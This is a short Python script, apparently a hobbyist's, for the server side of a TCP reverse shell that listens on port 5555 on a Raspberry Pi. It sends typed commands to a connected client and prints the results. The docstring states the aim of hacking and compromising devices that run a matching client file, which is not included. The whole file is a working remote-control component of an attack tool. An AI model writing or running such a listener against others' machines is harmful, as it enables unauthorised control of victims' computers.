#! /usr/bin/env python
"""This script will make my Raspberry Pi the server for a Reverse Shell
on TCP. I want to be able to better understand how to hack better and
use this script to hack devices that activate the client file. With this
I can see how I can comporomise a computer using Python. Time to get
started on this! This uses sockets as a way to connect, so it is good
Python practice for me!"""

import socket
import sys
import time

def send_commands(c):
	"""This will allow the server to send commands to the client to use 
	the reverse shell
	Parameter c = the connection between the server and client"""
	print("press Ctrl+C to end the connection.")
	print("Use the shell as normal, use at your own risk. Enjoy!")
	print("=> ", end="")
	while True:
		try:
			cmd = input()
			if len(cmd) > 0:
				c.sendall(cmd.encode("utf-8"))
				data = c.recv(4096)
				print(data.decode("utf-8"), end="")
		except KeyboardInterrupt:
			print("\nFarewell, young one..")
			c.close()
			sys.exit()
		except Exception as err:
			print(err)
			c.close()
			err.close()
			sys.exit()
	
def server():
	"""This functiton sets up the connection to the client. It sets up
	the server to listen for a client connection, and throws an error if
	the connection does not work."""
	
	IP = ''
	port = 5555
	#Start up the server for the socket
	try:
		s = socket.socket()
		#AF_INET is the IP, SOCK_STREAM means it is using TCP protocol 
		s.bind((IP, port))
		s.listen(5)
		print("Server has been started,")
		print("I am listening right now on port %s" % (str(port)) )
	except Exception as err:
		print("\nIt looks like we ran into a problem:")
		print(err)
		retry = input("\nWanna try again? (y/n): ")
		if retry.lower() == "y" or retry.lower() == "yes":
			print("\nOkay, retrying the connection, please wait...\n")
			time.sleep(2.5)
			server()
		else:
			print("\nOkay, thanks for trying though!\n")
			sys.exit()
	#Connecting with the client
	conn, addr = s.accept()
	print("Connection has been created! Woohoo!!")
	print("\nWe have a connection from %s" % (str(addr[0]) ))
	send_commands(conn)
if __name__ == "__main__":
	server()
